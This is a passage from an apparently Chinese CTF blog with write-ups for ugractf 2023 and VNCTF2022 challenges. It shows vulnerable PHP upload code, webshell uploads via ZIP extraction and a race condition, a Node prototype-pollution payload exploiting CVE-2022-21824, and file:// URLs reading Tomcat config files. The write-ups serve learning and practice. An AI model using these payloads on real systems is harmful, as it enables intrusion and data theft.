r_viper/ruby_lightning/flying_yearling/beryl_horse/nacre_unicorn/covert_packet/untouchable_screwdriver/orbiting_lathe/orange_piano/nacre_admiral/blue_yearling/covert_clarinet/urban_nomad/blue_drizzle/red_drill/unknown_projector/onyx_snow/chasing_pony/scheming_robot/ruby_weapon/rowdy_router/jet_jackal/scheming_device/spinning_drum/emerald_inspector/jade_hammer/urban_network/unknown_keyboard/obsidian_display/wireless_chain/unnecessary_commander/spinning_wizard/ivory_dragon/falling_beat/green_unicorn/threatening_welder/threatening_cyborg/urban_rhythm/green_moose/falling_lion/beryl_banjo/mountain_gazelle/revealing_drill/ivory_ink/wild_sun/mountain_gazelle/glass_network/dangerous_cottonmouth/amber_mill/emerald_weapon/insane_cottonmouth/jade_wildcat/glass_griffin/deadly_ink/waning_robot/beryl_piranha/wireless_cartridge/agate_gelding/green_orca/green_trombone/violet_foal/hunting_robot/unknown_inspector/desert_welder/destroyed_lathe/opal_trombone/sapphire_stallion/explosive_clarinet/glass_wizard/waning_warning/glass_boa/bone_hammerhead/killer_cleric/agate_beat/scheming_pegasus/destroyed_robot/insane_motherboard/untouchable_lobster/chasing_cornet/hunting_mask/unexpected_motherboard/falling_octopus/spinning_ink/violet_disk/unexpected_falcon/blue_weapon/killer_keyboard/coral_compressor/untouchable_trumpet/ivory_network/ruby_rhythm/blue_cartridge/scheming_sun/unexpected_case/glass_cartridge/chasing_keyboard/scheming_projector/untouchable_welder/sapphire_crab/untouchable_flute/flying_saxophone/searching_hail/pearl_thunder/agate_horse/amber_hammer/stalking_cornet/draconic_stag/untouchable_gelding/searching_router/draconic_chef/unexpected_sun/killer_inspector/green_camera/spinning_falcon/tundra_wildcat/wild_admiral/waning_memory/wireless_inspector/falling_cup/uncanny_banjo/onyx_orca/mountain_moose/deadly_device/jade_tiger/spinning_koala/revealing_packet/nacre_android/onyx_piccolo/nacre_clarinet/killer_cougar/orange_song/unexpected_mask/space_orca/opal_motherboard/bad_projector/insane_mainframe/uncanny_unicorn/unexpected_rhythm/coral_python/untouchable_fairy/unknown_filly/amber_octopus/tarnished_deer/dangerous_mermaid/unknown_piano/pearl_mask/coral_moose/amber_storm/covert_player/jade_grizzly/diamond_troll/deadly_boa/yellow_major/revealing_major/blue_major/spinning_thunder/warring_captain/waning_player/revealing_transistor/explosive_gazelle/jade_motherboard/urban_mask/jet_yeti/orbiting_snow/bone_viper/deadly_mainframe/space_falcon/orange_falcon/space_cobra/threatening_wildcat/wireless_drum/orbiting_dragon/opal_lion/desert_sun/untouchable_trumpet/jet_chain/sapphire_zebra/tundra_mainframe/revealing_organ/beryl_koala/threatening_elk/decisive_piano/nacre_zebra/stalking_saxophone/inconceivable_harp/tundra_captain/yellow_deer/red_projector/uncanny_pilot/rowdy_guitar/tarnished_warning/flying_beat/green_trumpet/pearl_moose/revealing_moose/diamond_horn/nacre_sidewinder/orbiting_griffin/uncanny_hammerhead/covert_hail/blue_foal/emerald_chef/explosive_gazelle/desert_robot/rowdy_lion/urban_piccolo/amber_sloth/chasing_zebra/ivory_yearling/insane_filly/tundra_captain/dangerous_hammer/space_flute/space_mask/flying_crab/spinning_jackal/untouchable_compressor/tarnished_piccolo/killer_motherboard/explosive_pilot/killer_lightning/decisive_robot/chasing_cup/onyx_violin/pearl_snow/diamond_sound/glass_major/decisive_thunder/searching_vacuum/field_gelding/ruby_pony/red_thunder/emerald_griffin/flying_saxophone/mountain_leopard/waning_network/inconceivable_transistor/hidden_camera/desert_crab/desert_cheetah/rowdy_organ/blue_piranha/hunting_song/waning_hail/warring_cottonmouth/destroyed_trombone/beryl_piano/inconceivable_commander/destroyed_robot/unnecessary_piranha/revealing_banjo/tarnished_jackal/hunting_welder/hidden_organ/uncanny_inspector/pearl_major/uncanny_lion/onyx_mixer/deadly_pegasus/violet_drum/red_unicorn/coral_storm/emerald_captain/coral_zebra/revealing_rhythm/chasing_tuba/dangerous_cougar/sapphire_cobra/yellow_wildcat/stalking_welder/obsidian_keyboard/red_robot/field_cup/green_welder/deadly_griffin/hidden_lobster/unexpected_zebra/orange_cheetah/deadly_drizzle/covert_piranha/deadly_rhythm/diamond_zebra/bone_banjo/agate_captain/spinning_yeti/insane_nomad/scheming_warning/hunting_welder/urban_sander/unnecessary_wildcat/waning_warning/ruby_viper/falling_boa/nacre_mask/deadly_lathe/revealing_chain/destroyed_beat/desert_drill/warring_jackal/destroyed_koala/inconceivable_camera/ruby_lathe/hunting_foal/field_deer/agate_major/obsidian_screwdriver/violet_pegasus/untouchable_snow/untouchable_cougar/&#x27;# 获取网页


for i in range(101):
    res = requests.get(url)
    res=res.text
    if &quot;Parent Directory&quot; in res:
        print(&#x27;傻逼玩意&#x27;)
        res=res.replace(&#x27;..&#x27;,&#x27;sb&#x27;)
    print(res)
        # 解析网页
    soup = BeautifulSoup(res, &#x27;html.parser&#x27;)
        # 找到所有的a标签
    links = soup.find_all(&#x27;a&#x27;)
        # 遍历a标签
    for link in links:
        #print(link)

            # 获取a标签的href属性
        href = link.get(&#x27;href&#x27;)
            # 拼接域名
        full_url = url + href
            # 访问拼接后的url
        res = requests.get(full_url)
        print(full_url,res.text)
        #print(full_url)

        if(&#x27;HREF&#x27; in res.text):
            break
            #url=full_url

        else:
            continue
    print(full_url)
    url=full_url
    print(url)
    print(&#x27;找到指定路径，前往下一个&#x27;)
    i+=1
    time.sleep(1)</code></pre>
<p>题目描述说大概一百个，但是我貌似得跑了俩小时才跑完，远不止一百个，值得庆幸的是最后也跑出来了</p>
<p>他的路径我也贴一下吧</p>
<pre><code class="hljs plaintext">https://depth.q.2023.ugractf.ru/pn4p0p46xjfno0zv/scheming_viper/wireless_cottonmouth/pearl_welder/killer_filly/orange_panther/ivory_screwdriver/orbiting_weapon/urban_moose/orbiting_harp/jade_warning/warring_python/searching_song/dangerous_nomad/explosive_gazelle/dangerous_leopard/stalking_barnacle/rowdy_chain/warring_motherboard/orbiting_chef/unnecessary_elk/opal_rhythm/bad_mixer/rowdy_cornet/opal_nomad/pearl_network/revealing_network/amber_cleric/explosive_commander/rowdy_trumpet/tundra_captain/orbiting_wrench/amber_camera/revealing_weapon/diamond_cleric/flying_player/rowdy_storm/revealing_rhythm/hunting_camera/orange_wildcat/tarnished_router/unknown_pegasus/bone_fairy/unknown_weapon/agate_horse/destroyed_troll/stalking_wrench/uncanny_mermaid/draconic_lobster/nacre_cheetah/coral_door/agate_general/yellow_nomad/urban_jackal/orange_mermaid/jet_hail/draconic_pony/unnecessary_commander/tarnished_battery/rowdy_general/green_tape/rowdy_mill/orbiting_device/blue_rhythm/ruby_deer/orbiting_welder/draconic_gelding/decisive_wizard/hunting_yeti/space_mermaid/unexpected_lion/hunting_welder/covert_nomad/jet_flute/scheming_tiger/destroyed_sound/amber_mare/glass_cartridge/mountain_tuba/threatening_projector/waning_cornet/destroyed_zebra/unknown_pony/ivory_violin/scheming_grizzly/desert_clarinet/wireless_projector/draconic_horse/orange_rhythm/ruby_stallion/onyx_compressor/warring_fairy/waning_yearling/hidden_pilot/urban_rhythm/diamond_thunder/obsidian_wrench/dangerous_lathe/stalking_nomad/obsidian_memory/warring_camera/decisive_wrench/destroyed_tiger/searching_compressor/nacre_admiral/bad_unicorn/wireless_beat/desert_yeti/orange_gazelle/violet_leopard/pearl_mill/bone_elk/warring_wizard/blue_tuba/diamond_rain/ivory_stag/blue_warning/orbiting_panther/bad_flute/nacre_cottonmouth/chasing_weapon/searching_boa/opal_elk/wild_jackal/unknown_projector/jet_lion/dangerous_transistor/decisive_hammerhead/sapphire_compressor/yellow_mask/hidden_hail/scheming_admiral/space_stag/amber_wizard/jet_chain/onyx_drill/explosive_door/beryl_chain/obsidian_cyborg/orange_hail/onyx_screwdriver/space_chef/wild_tiger/emerald_drought/orange_harp/jet_cyborg/falling_stallion/ivory_hail/unexpected_cottonmouth/desert_sidewinder/green_packet/emerald_barnacle/insane_battery/urban_general/space_case/bone_guitar/bad_major/tarnished_tiger/unnecessary_memory/sapphire_stallion/yellow_lightning/emerald_cello/tundra_elk/unexpected_yeti/desert_lobster/untouchable_device/inconceivable_wizard/coral_moose/decisive_device/red_commander/draconic_guitar/glass_yeti/killer_wildcat/agate_sander/rowdy_cleric/dangerous_chef/desert_welder/chasing_mixer/tarnished_router/jade_projector/falling_drill/rowdy_vacuum/tarnished_hammer/red_elk/pearl_filly/chasing_cobra/violet_mill/unknown_filly/beryl_horn/diamond_dragon/chasing_pegasus/destroyed_rain/amber_viper/ruby_lightning/flying_yearling/beryl_horse/nacre_unicorn/covert_packet/untouchable_screwdriver/orbiting_lathe/orange_piano/nacre_admiral/blue_yearling/covert_clarinet/urban_nomad/blue_drizzle/red_drill/unknown_projector/onyx_snow/chasing_pony/scheming_robot/ruby_weapon/rowdy_router/jet_jackal/scheming_device/spinning_drum/emerald_inspector/jade_hammer/urban_network/unknown_keyboard/obsidian_display/wireless_chain/unnecessary_commander/spinning_wizard/ivory_dragon/falling_beat/green_unicorn/threatening_welder/threatening_cyborg/urban_rhythm/green_moose/falling_lion/beryl_banjo/mountain_gazelle/revealing_drill/ivory_ink/wild_sun/mountain_gazelle/glass_network/dangerous_cottonmouth/amber_mill/emerald_weapon/insane_cottonmouth/jade_wildcat/glass_griffin/deadly_ink/waning_robot/beryl_piranha/wireless_cartridge/agate_gelding/green_orca/green_trombone/violet_foal/hunting_robot/unknown_inspector/desert_welder/destroyed_lathe/opal_trombone/sapphire_stallion/explosive_clarinet/glass_wizard/waning_warning/glass_boa/bone_hammerhead/killer_cleric/agate_beat/scheming_pegasus/destroyed_robot/insane_motherboard/untouchable_lobster/chasing_cornet/hunting_mask/unexpected_motherboard/falling_octopus/spinning_ink/violet_disk/unexpected_falcon/blue_weapon/killer_keyboard/coral_compressor/untouchable_trumpet/ivory_network/ruby_rhythm/blue_cartridge/scheming_sun/unexpected_case/glass_cartridge/chasing_keyboard/scheming_projector/untouchable_welder/sapphire_crab/untouchable_flute/flying_saxophone/searching_hail/pearl_thunder/agate_horse/amber_hammer/stalking_cornet/draconic_stag/untouchable_gelding/searching_router/draconic_chef/unexpected_sun/killer_inspector/green_camera/spinning_falcon/tundra_wildcat/wild_admiral/waning_memory/wireless_inspector/falling_cup/uncanny_banjo/onyx_orca/mountain_moose/deadly_device/jade_tiger/spinning_koala/revealing_packet/nacre_android/onyx_piccolo/nacre_clarinet/killer_cougar/orange_song/unexpected_mask/space_orca/opal_motherboard/bad_projector/insane_mainframe/uncanny_unicorn/unexpected_rhythm/coral_python/untouchable_fairy/unknown_filly/amber_octopus/tarnished_deer/dangerous_mermaid/unknown_piano/pearl_mask/coral_moose/amber_storm/covert_player/jade_grizzly/diamond_troll/deadly_boa/yellow_major/revealing_major/blue_major/spinning_thunder/warring_captain/waning_player/revealing_transistor/explosive_gazelle/jade_motherboard/urban_mask/jet_yeti/orbiting_snow/bone_viper/deadly_mainframe/space_falcon/orange_falcon/space_cobra/threatening_wildcat/wireless_drum/orbiting_dragon/opal_lion/desert_sun/untouchable_trumpet/jet_chain/sapphire_zebra/tundra_mainframe/revealing_organ/beryl_koala/threatening_elk/decisive_piano/nacre_zebra/stalking_saxophone/inconceivable_harp/tundra_captain/yellow_deer/red_projector/uncanny_pilot/rowdy_guitar/tarnished_warning/flying_beat/green_trumpet/pearl_moose/revealing_moose/diamond_horn/nacre_sidewinder/orbiting_griffin/uncanny_hammerhead/covert_hail/blue_foal/emerald_chef/explosive_gazelle/desert_robot/rowdy_lion/urban_piccolo/amber_sloth/chasing_zebra/ivory_yearling/insane_filly/tundra_captain/dangerous_hammer/space_flute/space_mask/flying_crab/spinning_jackal/untouchable_compressor/tarnished_piccolo/killer_motherboard/explosive_pilot/killer_lightning/decisive_robot/chasing_cup/onyx_violin/pearl_snow/diamond_sound/glass_major/decisive_thunder/searching_vacuum/field_gelding/ruby_pony/red_thunder/emerald_griffin/flying_saxophone/mountain_leopard/waning_network/inconceivable_transistor/hidden_camera/desert_crab/desert_cheetah/rowdy_organ/blue_piranha/hunting_song/waning_hail/warring_cottonmouth/destroyed_trombone/beryl_piano/inconceivable_commander/destroyed_robot/unnecessary_piranha/revealing_banjo/tarnished_jackal/hunting_welder/hidden_organ/uncanny_inspector/pearl_major/uncanny_lion/onyx_mixer/deadly_pegasus/violet_drum/red_unicorn/coral_storm/emerald_captain/coral_zebra/revealing_rhythm/chasing_tuba/dangerous_cougar/sapphire_cobra/yellow_wildcat/stalking_welder/obsidian_keyboard/red_robot/field_cup/green_welder/deadly_griffin/hidden_lobster/unexpected_zebra/orange_cheetah/deadly_drizzle/covert_piranha/deadly_rhythm/diamond_zebra/bone_banjo/agate_captain/spinning_yeti/insane_nomad/scheming_warning/hunting_welder/urban_sander/unnecessary_wildcat/waning_warning/ruby_viper/falling_boa/nacre_mask/deadly_lathe/revealing_chain/destroyed_beat/desert_drill/warring_jackal/destroyed_koala/inconceivable_camera/ruby_lathe/hunting_foal/field_deer/agate_major/obsidian_screwdriver/violet_pegasus/untouchable_snow/searching_griffin/</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115181041720.png?x-oss-process=hzy" alt="image-20230115181041720"></p>
<p>ugra_i_have_always_imagined_that_paradise_will_be_a_kind_of_library_7v1mlf5vo268</p>
<h1 id="ctb">CTB</h1>
<h2 id="доказательство-запугиванием">Доказательство запугиванием</h2>
<blockquote>
<p>Если бы олимпиады разрабатывали математики, потерявшие связь с реальностью, то они бы выглядели как-то так. Хотя постойте…</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192438442.png?x-oss-process=hzy" alt="image-20230115192438442"></p>
<p>看描述可以知道是可以上传ZIP文件的，先上传一个图片试一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192524582.png?x-oss-process=hzy" alt="image-20230115192524582"></p>
<p>发现报错，打开 ZIP 包装时出现错误代码 19，应该是对上传的文件进行了解压但是因为他是图片解压不了，所以可以大胆试一下，就直接用小马压缩成压缩包直接传过去</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192645166.png?x-oss-process=hzy" alt="image-20230115192645166"></p>
<p>发现解析了，可以执行命令，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192702155.png?x-oss-process=hzy" alt="image-20230115192702155"></p>
<p>ugra_this_aint_funny_this_is_cursed_tmecoyvx5n0u</p>
<p>最后这放一下这道题目上传功能的主要源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL | E_NOTICE);

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;archive&quot;</span>])) &#123;
<span class="hljs-variable">$zip_path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;archive&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];
<span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));

<span class="hljs-variable">$za</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
<span class="hljs-variable">$res</span> = <span class="hljs-variable">$za</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zip_path</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span> !== <span class="hljs-literal">true</span>) &#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Error code <span class="hljs-subst">$res</span> while extracting ZIP&lt;/p&gt;&quot;</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir_path</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Files uploaded:&lt;/p&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;ol&gt;&quot;</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$za</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;
<span class="hljs-variable">$stat</span> = <span class="hljs-variable">$za</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);

<span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$stat</span>[<span class="hljs-string">&quot;name&quot;</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$stat</span>[<span class="hljs-string">&quot;name&quot;</span>], -<span class="hljs-number">1</span>) === <span class="hljs-string">&quot;/&quot;</span>) &#123;
<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$file_path</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;zip://<span class="hljs-subst">$zip_path</span>#<span class="hljs-subst">&#123;$stat[&quot;name&quot;]&#125;</span>&quot;</span>, <span class="hljs-variable">$file_path</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;a href=&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$file_path</span>) . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$stat</span>[<span class="hljs-string">&quot;name&quot;</span>]) . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/li&gt;&quot;</span>;
&#125;
&#125;

<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ol&gt;&quot;</span>;
&#125;
&#125;</code></pre>
<h2 id="антивирус-возвращается">Антивирус возвращается</h2>
<blockquote>
<p>Современные антивирусы настолько прочно влезают в систему, что их с тем же успехом можно считать вирусами: границы все более и более размыты. А еще дыры в некоторых антивирусах приводят к запуску вирусного кода с правами администратора.</p>
<p>А вы спокойно спите по ночам?</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214308473.png?x-oss-process=hzy" alt="image-20230115214308473"></p>
<p>又是个文件上传，这个会检测可能是否是病毒，同时给了附件，源码分析一下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_malware</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$file_path</span></span>): <span class="hljs-title">string</span> </span>&#123;
<span class="hljs-variable">$line</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;file &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$file_path</span>), <span class="hljs-variable">$lines</span>);
<span class="hljs-variable">$log</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$lines</span>);
<span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$log</span>, <span class="hljs-string">&quot;executable&quot;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$log</span>, <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;ByIvanov&quot;</span>)) === <span class="hljs-literal">false</span>) === (<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">10</span>)) &#123;
<span class="hljs-variable">$log</span> .= <span class="hljs-string">&quot;\nProbably a virus!&quot;</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
<span class="hljs-variable">$log</span> .= <span class="hljs-string">&quot;\nMost likely not a virus.&quot;</span>;
&#125;
<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// We must pretend that we are doing something useful</span>
<span class="hljs-keyword">return</span> <span class="hljs-variable">$log</span>;
&#125;
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Ivanov Anti-Virus&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
Upload the file to check:

&lt;form method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;
&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;malware&quot;</span>&gt;
&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span>&gt;
&lt;/form&gt;

<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;malware&quot;</span>])) &#123;
<span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;malware&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);
<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[-0-9a-zA-Z_\.]+$/&quot;</span>, <span class="hljs-variable">$file_name</span>)) &#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Dangerous filename&quot;</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
<span class="hljs-variable">$file_path</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$filename</span>;
<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;malware&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$file_path</span>)) &#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to upload file&quot;</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
<span class="hljs-meta">?&gt;</span>
Check results:

&lt;pre&gt;<span class="hljs-meta">&lt;?=</span><span class="hljs-title function_ invoke__">check_malware</span>(<span class="hljs-variable">$file_path</span>)<span class="hljs-meta">?&gt;</span>&lt;/pre&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file_path</span>);
&#125;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span>
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>一眼顶针，条件竞争，上传木马webshell即可得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214449207.png?x-oss-process=hzy" alt="image-20230115214449207"></p>
<p>ugra_ever_wondered_who_uses_virustotal_most_huh_vz00vcyc5wh6</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2022---WP</title>
    <url>/2022/02/12/VNCTF2022WP/</url>
    <content><![CDATA[<p><strong>比赛做出来的题目做一些记录</strong></p>
<span id="more"></span>
<h2 id="gamev40">GameV4.0</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ead1677d2ad597c53bfb2cdf1a13a5e8.png?x-oss-process=hzy" alt="image-20220212132916406"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/64becc640c08905a842b4a2f73d7792f.png?x-oss-process=hzy" alt="image-20220212132943001"></p>
<p>看这样子又是个游戏，这样的题考察的都比较基础！看到这个题娱乐性的玩了几局，没啥意思，开始正常做题吧！</p>
<p>代码审计，搜索flag<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/86b54f8306cc9056a8746300d2cb977d.png?x-oss-process=hzy" alt="image-20220212133150686"></p>
<p>一点就中！<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/324d0233209e4fc1d6429414d574469b.png?x-oss-process=hzy" alt="image-20220212133205891"></p>
<p>base64解密<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/058e790958e6bc9c07ad44996a3858b2.png?x-oss-process=hzy" alt="image-20220212133234720"></p>
<p>稍微改一下即得到flag！VNCTF{Welcome_to_VNCTF2022}</p>
<h2 id="gocalc0">gocalc0</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0e98bffdfd127fc1d02517b4a4b0ea98.png?x-oss-process=hzy" alt="image-20220217215928285"></p>
<p>点击flag在这里，发现flag在运行里！<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/55f91762564bfce50b00107ad024ca56.png?x-oss-process=hzy" alt="image-20220217220006414"></p>
<p>这个时候考虑到应该是在传输的过程中有重要数据，用抓包看一下！<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/96b7e2b8d7150c534e7e027ebd8dc56d.png?x-oss-process=hzy" alt="image-20220217220056349"></p>
<p>send数据之后看到了cookie的数据貌似是base64加密，尝试解密后发现还是base64加密，两次base64解密后得到flag！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/6e8ce4e1331aee73d525eac9385de2cf.png?x-oss-process=hzy" alt="image-20220217220156892"></p>
<h2 id="newcalc0">newcalc0</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ed918af49212a1373b66e25855a5ac1f.png?x-oss-process=hzy" alt="image-20220217222238456"></p>
<p>这个有一个源代码，看一下！</p>
<pre><code class="hljs plaintext">const express = require(&quot;express&quot;);
const path = require(&quot;path&quot;);
const vm2 = require(&quot;vm2&quot;);

const app = express();
app.use(express.urlencoded(&#123; extended: true &#125;));
app.use(express.json());

app.use(express.static(&quot;static&quot;));

const vm = new vm2.NodeVM();

app.use(&quot;/eval&quot;, (req, res) =&gt; &#123;
  const e = req.body.e;
  if (!e) &#123;
    res.send(&quot;wrong?&quot;);
    return;
  &#125;
  try &#123;
    res.send(vm.run(&quot;module.exports=&quot;+e)?.toString() ?? &quot;no&quot;);
  &#125; catch (e) &#123;
    console.log(e)
    res.send(&quot;wrong?&quot;);
  &#125;
&#125;);

app.use(&quot;/flag&quot;, (req, res) =&gt; &#123;
  if(Object.keys(Object.prototype).length &gt; 0) &#123;
    Object.keys(Object.prototype).forEach(k =&gt; delete Object.prototype[k]);
    res.send(process.env.FLAG);
  &#125; else &#123;
    res.send(Object.keys(Object.prototype));
  &#125;
&#125;)

app.use(&quot;/source&quot;, (req, res) =&gt; &#123;
  let p = req.query.path || &quot;/src/index.js&quot;;
  p = path.join(path.resolve(&quot;.&quot;), path.resolve(p));
  console.log(p);
  res.sendFile(p);
&#125;);

app.use((err, req, res, next) =&gt; &#123;
  console.log(err)
  res.redirect(&quot;index.html&quot;);
&#125;);

app.listen(process.env.PORT || 8888);</code></pre>
<p>看了官方wp发现这是考察原型链污染，利用的是CVE-2022-21824</p>
<pre><code class="hljs plaintext">https://nodejs.org/zh-cn/blog/vulnerability/jan-2022-security-releases/</code></pre>
<p>首先需要bp抓包然后payload一下下面的内容：</p>
<pre><code class="hljs plaintext">console.table([&#123;a:1&#125;],[&#x27;__proto__&#x27;])</code></pre>
<p>之后直接访问/flag就出来结果了!</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/86435b307e352ebcb3bc200a778e55c7.png?x-oss-process=hzy" alt="image-20220217222805239"></p>
<blockquote>
<p><code>console.table</code>API的作用是将数据以表格的形式显示。</p>
</blockquote>
<p>推荐：</p>
<p>两个在线反编译网站</p>
<pre><code class="hljs plaintext">http://www.javadecompilers.com
https://www.decompiler.com/</code></pre>
<h2 id="easyjava复现">easyJava[复现]</h2>
<pre><code class="hljs plaintext">/file?url=file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
/file?url=file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/c2c8f49c3092e7b60b403b5aa1df00ce.png?x-oss-process=hzy" alt="image-20220314212140534"></p>
<p>查看classes发现上图这些文件，查看servlet<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/fd043d0c34d7d7c04d9c629d2a6486ac.png?x-oss-process=hzy" alt="image-20220314212345047"></p>
<p>继续查看文件，第二个文件，得到附件，进去审计！<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d01cc32b13c744a74d3206cb21ebdc3c.png?x-oss-process=hzy" alt="img"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/21f2df90aa809ffbe1eb8ff5f789efcd.png?x-oss-process=hzy" alt="image-20220314212415116"></p>
<p>要获取flag就得使得key的值正确且反序列化出来的user对象属性值要与this.user当中一致。</p>
<p>如何获取key 在doGet函数中 if 和 else当中的判断相同 冲突<br>
要想获取key 只能通过条件竞争 才能在上面的判断中不成立 进入else后得到正确的name<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/615934892be30fd5ad65532847bf18f2.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext"># -*- coding: UTF-8 -*-
import requests
import threading
